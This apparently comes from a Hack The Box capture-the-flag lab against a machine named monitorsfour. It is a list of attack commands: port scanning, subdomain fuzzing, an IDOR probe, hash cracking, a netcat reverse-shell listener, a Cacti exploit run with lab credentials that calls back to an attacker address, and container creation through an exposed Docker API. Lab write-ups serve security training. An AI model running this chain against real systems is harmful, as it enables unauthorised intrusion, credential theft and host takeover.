# Nmap
nmap -p- --min-rate 10000 10.10.10.245

# FFUF
ffuf -w subdomains-top1million-5000.txt \
-u http://monitorsfour.htb \
-H "Host: FUZZ.monitorsfour.htb" -ac

# Feroxbuster
feroxbuster -u http://monitorsfour.htb -d 2 -C 404

# IDOR
curl "http://monitorsfour.htb/user?token=0"

# Hashcat
hashcat -m 0 hashes.txt rockyou.txt.gz

# Reverse shell
nc -lvnp 9001

# Cacti exploit
sudo python3 exploit.py -url http://cacti.monitorsfour.htb \
-u marcus -p wonderful1 -i 10.10.14.36 -l 9001

# Docker API scan
for i in $(seq 1 254); do curl http://192.168.65.$i:2375/version; done

# Docker container
curl -X POST http://192.168.65.7:2375/containers/create
curl -X POST http://192.168.65.7:2375/containers/<id>/start
